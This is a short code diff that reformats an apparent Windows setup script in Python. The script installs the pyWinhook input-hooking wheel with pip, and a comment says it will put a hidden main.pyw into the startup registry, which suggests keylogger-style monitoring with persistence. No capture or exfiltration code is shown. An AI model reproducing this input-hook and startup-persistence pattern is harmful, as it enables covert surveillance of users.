@@ -1,9 +1,17 @@
 import os
-import winreg as reg1
 import subprocess
 import sys
+import winreg as reg1
 
-subprocess.check_call([sys.executable, "-m", "pip", "install", "'pyWinhook-1.6.2-cp39-cp39-win_amd64.whl'"])
+subprocess.check_call(
+    [
+        sys.executable,
+        "-m",
+        "pip",
+        "install",
+        "'pyWinhook-1.6.2-cp39-cp39-win_amd64.whl'",
+    ]
+)
 
 
 # put main.pyw into startup reg
